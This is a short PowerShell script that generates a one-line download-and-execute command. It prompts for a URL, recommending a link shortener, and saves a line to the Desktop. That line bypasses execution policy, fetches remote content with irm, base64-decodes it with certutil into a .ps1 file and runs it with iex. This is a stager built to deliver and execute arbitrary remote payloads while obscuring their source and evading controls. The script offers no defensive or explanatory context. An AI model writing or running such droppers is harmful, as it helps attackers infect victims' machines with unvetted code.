function Base64-irm {
    $url = Read-Host "Enter the URL (use https://t.ly/)"

    $scriptContent = @"
powershell -NoP -Ep Bypass irm $url|sc "C:\Users\$env:USERNAME\Desktop\e.txt";certutil -f -decode "C:\Users\$env:USERNAME\Desktop\e.txt" "C:\Users\$env:USERNAME\Desktop\d.ps1";iex "C:\Users\$env:USERNAME\Desktop\d.ps1"
"@

    $scriptPath = "$env:USERPROFILE\Desktop\Base64-irm.txt"
    Set-Content -Path $scriptPath -Value $scriptContent

    Write-Host "Script saved as $scriptPath"
}

Base64-irm
